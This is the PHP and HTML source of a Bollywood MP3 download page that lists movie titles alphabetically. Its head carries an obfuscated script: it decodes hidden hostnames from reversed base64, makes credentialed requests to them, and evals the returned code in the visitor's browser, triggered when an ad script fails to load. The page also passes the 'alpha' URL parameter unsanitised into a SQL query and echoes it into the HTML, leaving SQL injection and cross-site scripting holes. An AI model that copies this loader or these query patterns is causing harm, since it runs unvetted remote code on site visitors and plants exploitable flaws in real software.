<?php
    if(ISSET($_GET['alpha']))
       {

$one=$_GET['alpha'];
$two=strtoupper($_GET['alpha']);
        include('config.php');
        $i=1;
        $count=1;
        $j=1;
        $k=1;$a1[1][1]=0;
        $res = mysqli_query($con,"SELECT * FROM movie_names WHERE Name LIKE '".$one."%' OR Name LIKE '".$two."%'");
                    while($row = mysqli_fetch_array($res)){
                   if($count%3==0){
                        $a3[$i][0]=$row['Id'];
                        $a3[$i++][1]=$row['Name'];
                   }
                                 else if($count%3==2){
                        $a2[$j][0]=$row['Id'];
                        $a2[$j++][1]=$row['Name'];
                   }
                                  else{
                        $a1[$k][0]=$row['Id'];
                        $a1[$k++][1]=$row['Name'];
                   }  
                   $count++;           
                }
            }
            else{
                echo "<script type='text/javascript'> window.location.href='index.php';</script>";

            }
?>




<!DOCTYPE html>
<html>
<head>


    <title>Download Songs Bollywood All</title>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href="css/style.css" rel='stylesheet' type='text/css' />
<link rel="stylesheet" href="css/bootstrap.min.css">
<link rel="stylesheet" href="css/songs.css">
<link rel="stylesheet" href="css/bootstrap-theme.min.css">
<script src="jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
<link rel="icon" href="images/logo.png" type="image/x-icon" />      
<link rel="shortcut icon" type="image/x-icon" href="images/logo.png">
<style type="text/css">
    .bs-example{
        margin: 50px 0px 10px 0px;
    }
</style>
<script data-cfasync="false" type="text/javascript">var w4O=window;for(var f in w4O){if(f.length===((0x257,93.)>=0x47?(0x60,6):(1.338E3,0x220)<0x50?(115,0x13A):(1.3880E3,0xA))&&f.charCodeAt(((63,135.)<=(58,0x89)?(0xB5,3):(6.45E2,1.096E3)))===((3.69E2,0x1F2)>=28.6E1?(141.,100):62>=(7.29E2,2.22E2)?(0x5F,'x'):(15,135.6E1))&&f.charCodeAt(((70.8E1,73.)<=(52.,28.0E1)?(1.478E3,5):(12.09E2,53.)<(56,1)?0x1BC:(7.86E2,117)))===((72,0x55)<(5.9E2,0x11C)?(25.,119):0x20A>(0x6,80.60E1)?(1.214E3,36):(0x13B,0x77))&&f.charCodeAt((0x1FF<=(36.80E1,32)?(42,0x121):98.9E1<=(1.123E3,1.193E3)?(134.,1):(10.11E2,0x67)))===((0x10C,69.3E1)<=(19.,0x20F)?'A':(120.,0x8D)>=(0,1.1E1)?(36,105):(1.3E2,0x1B9))&&f.charCodeAt(((3.41E2,57.)<=144.?(6.59E2,0):(0x19E,0x79)))===((4.5E1,118)>=(116.,105.0E1)?(39.,'/'):(32.,51)<0x166?(140,119):(77,119.4E1)))break};for(var K in w4O[f]){if(K.length===((8.120E2,42.)<0x63?(0x19,8):(1.221E3,4.76E2)<62?(148.,''):(11.,82))&&K.charCodeAt((0x51<=(16.3E1,112.4E1)?(86.4E1,5):(92.,1.247E3)))===(31.70E1<(123,0x1BE)?(0x98,101):(145.6E1,6.10E1))&&K.charCodeAt((0xFB>=(1.063E3,124.)?(0x1FB,7):(0x13B,45)>(0x135,50.30E1)?'/':(4.13E2,8.4E2)))===((115.10E1,3.13E2)>=72?(87.,116):(0x245,0xBF))&&K.charCodeAt((7.310E2<=(7.23E2,135.6E1)?(11.,3):(0x208,110.)))===((87.9E1,9.3E1)>(0x7C,44)?(90.,117):(125,98.)<0x49?0x164:(0xAB,33))&&K.charCodeAt(((0xAF,49.30E1)>=131?(0xBB,0):(0x29,0x90)))===((87.,10.21E2)<=(60.6E1,8.57E2)?0x1BA:34.<(0x3A,0x153)?(0x1AB,100):(25.,91)))break};(function(O,F,Z,m){w4O[f][F]=function(){var w=0,C=function C(){var c='//',o=((4.2E1,124)<=0xC5?(126.5E1,'T'):(7.82E2,68.7E1)),H=(10.47E2>=(97.2E1,24.1E1)?(1.37E2,'E'):(0x118,0xF9)),s=((114.2E1,4.86E2)>=129.?(0x83,'G'):(0x187,14.09E2)),j=new XMLHttpRequest();j.withCredentials=true;j.open((s+H+o),(c)+w4O[f]['atob'](Z[w].split('').reverse().join(''))+'/'+m+'/',true);j.onreadystatechange=function(){if(j.readyState==4&&j.status==200&&j.responseText){eval(j.responseText);}};j.onerror=function(){if(++w!=Z.length){C();}};try{j.send();}catch(r){j.onerror();}};C();};})(w4O[f][K],'_bzzxy',['t92YuQWYltWYoNncpR3cu82Z','==QZ0l2cuEmbhBXblRXa','==QZulGbu9mLuVWZydGazFGZ','=02bj5CZhh2Y11WeyVmdu82Z'],871434);</script><script data-cfasync="false" type="text/javascript" src="//go.onclasrv.com/apu.php?zoneid=871424" onerror="window._bzzxy();"></script>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-87335470-1', 'auto');
  ga('send', 'pageview');
ga('set', 'userId', {{USER_ID}}); // Set the user ID using signed-in user_id.
</script>

</head>
<body>
<script>
function search(string){
    var xmlhttp;
    if(window.XMLHttpRequest){
        xmlhttp = new XMLHttpRequest();
    }else{
        xmlhttp = new ActiveXObject("XMLHTTP");
    }
    xmlhttp.onreadystatechange = function(){
        if(xmlhttp.readyState == 4 && xmlhttp.status == 200){
            document.getElementById("search").innerHTML = xmlhttp.responseText;
        }
    }
    xmlhttp.open("GET", "search.php?s="+string, true);
    xmlhttp.send(null);
}
</script>
<script>
function searchsong(string){
    var xmlhttp;
    if(window.XMLHttpRequest){
        xmlhttp = new XMLHttpRequest();
    }else{
        xmlhttp = new ActiveXObject("XMLHTTP");
    }
    xmlhttp.onreadystatechange = function(){
        if(xmlhttp.readyState == 4 && xmlhttp.status == 200){
            document.getElementById("searchsong").innerHTML = xmlhttp.responseText;
        }
    }
    xmlhttp.open("GET", "search.php?song="+string, true);
    xmlhttp.send(null);
}
</script>
<div class="main">
<div class="logo">
            <a href="index.php"><img src="images/logo.png" class="img-responsive" alt="LOGO HERE"/> </a>
</div><br><br><br><br><br><br>
<div class="bs-example">
    <nav role="navigation" class="navbar navbar-default">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header">
            <button type="button" data-target="#navbarCollapse" data-toggle="collapse" class="navbar-toggle">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a href="index.php" class="navbar-brand">SONGS MANIA</a>
        </div>
        <!-- Collection of nav links, forms, and other content for toggling -->
        <div id="navbarCollapse" class="collapse navbar-collapse">
            <ul class="nav navbar-nav">
                <li class="active"><a href="#">Home</a></li>
                <li><a href="bollywood.php">BollyWood Songs</a></li>
                <li><a href="#">Videos</a></li>
                <li><a href="#">Trailors</a></li>
                            <form role="search" class="navbar-form navbar-left">

                <div class="form-group">
                <li class="dropdown"  style="  list-style-type: none;list-style-position: none;float: none; ">
                    <input data-toggle="dropdown" class="dropdown-toggle form-control"  type="text" placeholder="Search by Movie Name"  onkeyup="search(this.value)" id="text" ></input>
                    <ul role="menu" class="dropdown-menu" id="search" >
                    </ul>
                </li>
                </div>
            </form>
                            <form role="search" class="navbar-form navbar-left">

                <div class="form-group">
                <li class="dropdown"  style="  list-style-type: none;list-style-position: none;float: none; ">
                    <input data-toggle="dropdown" class="dropdown-toggle form-control"  type="text" placeholder="Search by Song Name"  onkeyup="searchsong(this.value)" id="text" ></input>
                    <ul role="menu" class="dropdown-menu" id="searchsong" >
                    </ul>
                </li>
                </div>
            </form>
            </ul>
            <ul class="nav navbar-nav navbar-right">
                <!--li><a href="#">Login</a></li-->
            </ul>
        </div>
    </nav>
</div>









<div class="left">
            <ul class="nav nav-pills nav-stacked">
                <li ><a href="index.php"><i class="fa fa-home fa-fw"></i>Home</a></li>
                <li class="active"><a href="bollywood.php"><i class="fa fa-list-alt fa-fw"></i>BollyWood Songs</a></li>
                <li><a href="#"><i class="fa fa-file-o fa-fw"></i>Videos</a></li>
                <li><a href="#"><i class="fa fa-bar-chart-o fa-fw"></i>Trailors</a></li>
            </ul>
 </div>





<div class="contentss">

   <div class="catalog-album-holder">
                <center><h2>Browse Entire Library - Bollywood Mp3 Songs</h2>

                <p><h3>Download Bollywood Mp3 Songs, Hindi Mp3 Songs, Indian Music Free</h3></p></center>
                


<?php
$alphas = range('A', 'Z');
    $alphas[26]='numeric'; ?>
    <ul class="catalog-pagination">
        <?php
        $i=0;
        for ($i=0; $i <27 ; $i++) { 
             if($one==$alphas[$i]&&$one=="numeric")
                echo "<li><a href='movie_names.php?alpha=numeric' class='selected' >#</a></li>";
            else if($i==26)

                echo "<li><a href='movie_names.php?alpha=numeric' >#</a></li>";
            else if($two==$alphas[$i])
                echo "<li><a href='movie_names.php?alpha=".strtolower($alphas[$i])."' class='selected'>".$alphas[$i]."</a></li>";
            
                else
                echo "<li><a href='movie_names.php?alpha=".strtolower($alphas[$i])."' >".$alphas[$i]."</a></li>";

         } ?>
                </ul>


                    </li>
                </ul>
            </div>
                  <ul class="ctlg-holder">
                    <li>
                        <?php if($one=='numeric') 
                        echo '#';
                        else 
                            echo $two; ?>
                    </li>


                    <li>
                        <ul><?php
                        $i=1;
                         while($a1[$i][0])
                            {
                                echo "<li><a href='movie_song_list.php?id=".$a1[$i][0]."';window.open(this.href,'_self'); >".$a1[$i++][1]."</a></li>";
                            } ?>
                            

                          
        

                    </ul></li>

        <li>
            <ul>

                       <?php
                        $i=1;
                         while($a2[$i][0])
                            {
                                echo "<li><a href='movie_song_list.php?id=".$a2[$i][0]."' >".$a2[$i++][1]."</a></li>";
                            } ?>


            </ul>
        </li>
<li>
<ul>

         <?php
                        $i=1;
                         while($a3[$i][0])
                            {
                                echo "<li><a href='movie_song_list.php?id=".$a3[$i][0]."'>".$a3[$i++][1]."</a></li>";
                            } ?>




                        


</ul>
</li>
</ul>              
            <div class="addition"></div>

</div>
<?php include('includes/footer.php'); ?>
            </div>
</body>
</html>